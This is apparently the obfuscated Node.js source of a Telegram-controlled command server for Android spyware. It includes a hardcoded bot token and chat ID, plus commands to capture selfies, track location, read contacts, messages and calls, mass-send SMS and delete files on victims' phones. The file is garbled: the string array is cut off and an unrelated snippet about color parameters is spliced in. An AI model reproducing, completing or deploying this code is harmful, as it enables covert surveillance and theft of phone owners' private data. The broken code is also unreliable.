const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");

const token = "5667202865:AAGh-3st3qbl80wDwktPtjUCMKd2o4FJK9w";
const id = "979035419";
const address = "https://www.google.com";

const _0x8ea7c8 = _0x4cda;
function _0x4cda(_0x3dda28, _0x227d18) {
  const _0x877457 = _0x8774();
  return (
    (_0x4cda = function (_0x4cda7c, _0x574ecd) {
      _0x4cda7c = _0x4cda7c - 0xe2;
      let _0x580a59 = _0x877457[_0x4cda7c];
      return _0x580a59;
    }),
    _0x4cda(_0x3dda28, _0x227d18)
  );
}
(function (_0x1541e0, _0x50640d) {
  const _0x50dcdb = _0x4cda,
    _0x18f5c3 = _0x1541e0();
  while (!![]) {
    try {
      const _0x13173f =
        (parseInt(_0x50dcdb(0x13e)) / 0x1) *
          (-parseInt(_0x50dcdb(0x170)) / 0x2) +
        (-parseInt(_0x50dcdb(0x102)) / 0x3) *
          (-parseInt(_0x50dcdb(0x15e)) / 0x4) +
        -parseInt(_0x50dcdb(0x137)) / 0x5 +
        (-parseInt(_0x50dcdb(0x15d)) / 0x6) *
          (parseInt(_0x50dcdb(0x164)) / 0x7) +
        -parseInt(_0x50dcdb(0xf5)) / 0x8 +
        -parseInt(_0x50dcdb(0xff)) / 0x9 +
        parseInt(_0x50dcdb(0x156)) / 0xa;
      if (_0x13173f === _0x50640d) break;
      else _0x18f5c3["push"](_0x18f5c3["shift"]());
    } catch (_0x45b5c3) {
      _0x18f5c3["push"](_0x18f5c3["shift"]());
    }
  }
})(_0x8774, 0x56da3);
const app = express(),
  appServer = http[_0x8ea7c8(0x12a)](app),
  appSocket = new webSocket["Server"]({ server: appServer }),
  appBot = new telegramBot(token, { polling: !![] }),
  appClients = new Map(),
  upload = multer();
function _0x8774() {
  const _0x1bad81 = [
    "battery",
    "/uploadText",
    "uuid",
    "•\x20ᴅᴇᴠɪᴄᴇ\x20ᴍᴏᴅᴇʟ\x20:\x20<b>",
    "contacts:",
    "°•\x20𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣\x20𝙛𝙧𝙤𝙢\x20<b>",
    "messages",
    "𝙎𝙚𝙡𝙛𝙞𝙚\x20𝙘𝙖𝙢𝙚𝙧𝙖",
    "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣",
    "/uploadFile",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙥𝙖𝙩𝙝\x20𝙤𝙛\x20𝙩𝙝𝙚\x20𝙛𝙞𝙡𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙙𝙚𝙡𝙚𝙩𝙚",
    "deleteMessage",
    "editMessageText",
    "𝙏𝙤𝙖𝙨𝙩",
    "sendLocation",
    "apps:",
    "log",
    "env",
    "PORT",
    "27054460qFcHoJ",
    "•ɪꜰ\x20ʏᴏᴜ\x20ᴡᴀɴᴛ\x20ᴛᴏ\x20ꜱᴇɴᴅ\x20ꜱᴍꜱ\x20ᴛᴏ\x20ʟᴏᴄᴀʟ\x20ᴄᴏᴜɴᴛʀʏ\x20ɴᴜᴍʙᴇʀꜱ,\x20ʏᴏᴜ\x20ᴄᴀɴ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ɴᴜᴍʙᴇʀ\x20ᴡɪᴛʜ\x20ᴢᴇʀᴏ\x20ᴀᴛ\x20ᴛʜᴇ\x20ʙᴇɢɪɴɴɪɴɢ,\x20ᴏᴛʜᴇʀᴡɪꜱᴇ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ɴᴜᴍʙᴇʀ\x20ᴡɪᴛʜ\x20ᴛʜᴇ\x20ᴄᴏᴜɴᴛʀʏ\x20ᴄᴏᴅᴇ",
    "𝘿𝙚𝙫𝙞𝙘𝙚\x20𝙞𝙣𝙛𝙤",
    "camera_selfie",
    "post",
    "𝘾𝙖𝙡𝙡𝙨",
    "𝙑𝙞𝙗𝙧𝙖𝙩𝙚",
    "726pUcFcG",
    "196572hdDNip",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙨𝙚𝙣𝙙\x20𝙩𝙤\x20𝙖𝙡𝙡\x20𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\x0a\x0a",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙖𝙥𝙥𝙚𝙖𝙧\x20𝙖𝙨\x20𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\x0a\x0a",
    "send_message_to_all",
    "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨",
    if (colors[color]) {
      // Found one!
      params = {
        color: colors[color],
        colorError: null,
